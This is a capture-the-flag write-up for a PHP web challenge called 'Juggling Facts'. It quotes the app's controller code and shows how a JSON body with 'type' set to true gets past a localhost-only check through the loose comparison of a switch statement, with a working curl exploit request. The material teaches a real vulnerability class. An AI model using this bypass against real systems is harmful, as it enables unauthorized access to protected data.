# [Web] Juggling Facts

This web application is written in PHP, and serves facts from an API endpoint

```php
$router = new Router();
$router->new('GET', '/', 'IndexController@index');
$router->new('POST','/api/getfacts', 'IndexController@getfacts');
```

The function `getfacts` returns the flag only if the `type` is set to the string `secrets` (type validation with `===`) in the JSON payload, and has a limitation on the IP requesting it, which must be local

```php
    public function getfacts($router)
    {
        $jsondata = json_decode(file_get_contents('php://input'), true);

        if ( empty($jsondata) || !array_key_exists('type', $jsondata))
        {
            return $router->jsonify(['message' => 'Insufficient parameters!']);
        }

        if ($jsondata['type'] === 'secrets' && $_SERVER['REMOTE_ADDR'] !== '127.0.0.1')
        {
            return $router->jsonify(['message' => 'Currently this type can be only accessed through localhost!']);
        }
```

Once this round of validation is done, the json is passed in a `switch`, for it to call the corresponding method

```php
        switch ($jsondata['type'])
        {
            case 'secrets':
                return $router->jsonify([
                    'facts' => $this->facts->get_facts('secrets')
                ]);
```

The problem is that `switch` is vulnerable to [type juggling](https://www.php.net/manual/en/language.types.type-juggling.php) (hence the name of the challenge). Setting `type` to `true`, we can pass the validation, and still end up in the first branch of the `switch`

```bash
$ curl -vd '{"type":true}' 178.62.85.130:32116/api/getfacts
```
